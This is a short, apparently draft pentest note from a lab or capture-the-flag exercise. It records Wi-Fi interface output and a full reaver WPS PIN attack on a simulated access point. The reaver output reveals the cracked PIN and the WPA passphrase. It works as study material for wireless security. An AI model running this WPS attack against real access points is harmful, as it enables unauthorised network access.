---
title: Wi-Fi Interface and WPS Attack Using Reaver
aliases: []
tags:
- os/linux
- technique/wireless-attack
- tool/reaver
category: os
status: draft
date_created: '2026-08-26'
date_modified: '2026-08-26'
source: attacking-wifi.md
related_tools:
- '[[reaver]]'
- '[[hostapd]]'
related_techniques:
- '[[wireless-attack]]'
related_tactics: []
related_services:
- '[[hostapd]]'
related_os:
- '[[wlan1]]'
- '[[mon0]]'
related_notes: []
mitre_tactic: ''
mitre_technique: ''
real_path: /dev/wlan1
port: ''
protocol: ''
os: linux
---

# Wi-Fi Interface and WPS Attack Using Reaver

## Wi-Fi Interface Status
- `iwconfig` output:

```sh
root@wifinetic:~# iwconfig
hwsim0    no wireless extensions.

lo        no wireless extensions.

wlan2     IEEE 802.11  ESSID:off/any  Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm  Retry short limit:7   RTS thr:off   Fragment thr:off
Encryption key:off
Power Management:on

eth0      no wireless extensions.

mon0      IEEE 802.11  Mode:Monitor  Tx-Power=20 dBm  Retry short limit:7   RTS thr:off   Fragment thr:off
Power Management:on

wlan1     IEEE 802.11  ESSID:"OpenWrt"  Mode:Managed  Frequency:2.412 GHz  Access Point: 02:00:00:00:00:00  Bit Rate:5.5 Mb/s  Tx-Power=20 dBm  Retry short limit:7   RTS thr:off   Fragment thr:off
Encryption key:off
Power Management:on
Link Quality=70/70  Signal level=-30 dBm  Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
Tx excessive retries:0  Invalid misc:8   Missed beacon:0

wlan0     IEEE 802.11  Mode:Master  Tx-Power=20 dBm  Retry short limit:7   RTS thr:off   Fragment thr:off
Power Management:on
```

- `mon0` is in monitor mode.
- Access point BSSID: `02:00:00:00:00:00`.

## WPS Attack Using Reaver
- `reaver` command to crack WPS PIN:

```sh
root@wifinetic:~# reaver -i mon0 -b 02:00:00:00:00:00 -vv -c 1

Reaver v1.6.5 WiFi Protected Setup Attack Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>

[+] Switching mon0 to channel 1
[+] Waiting for beacon from 02:00:00:00:00
[+] Received beacon from 02:00:00:00:00
[+] Trying pin "12345670"
[+] Sending authentication request
[!] Found packet with bad FCS, skipping...
[+] Sending association request
[+] Associated with 02:00:00:00:00 (ESSID: OpenWrt)
[+] Sending EAPOL START request
[+] Received identity request
[+] Sending identity response
[+] Received M1 message
[+] Sending M2 message
[+] Received M3 message
[+] Sending M4 message
[+] Received M5 message
[+] Sending M6 message
[+] Received M7 message
[+] Sending WSC NACK
[+] Sending WSC NACK
[+] Pin cracked in 2 seconds
[+] WPS PIN: '12345670'
[+] WPA PSK: 'WhatIsRealAnDWhAtIsNot51121!'
[+] AP SSID: 'OpenWrt'
[+] Nothing done, nothing to save.
```

- The WPS PIN was cracked in 2 seconds.

## Hostapd Service
- `hostapd` service status:

```sh
root@wifinetic:~# systemctl status hostapd.service
```

- This command is used to check the status of the hostapd service, which is used in routers and Android phones to create and manage access points.

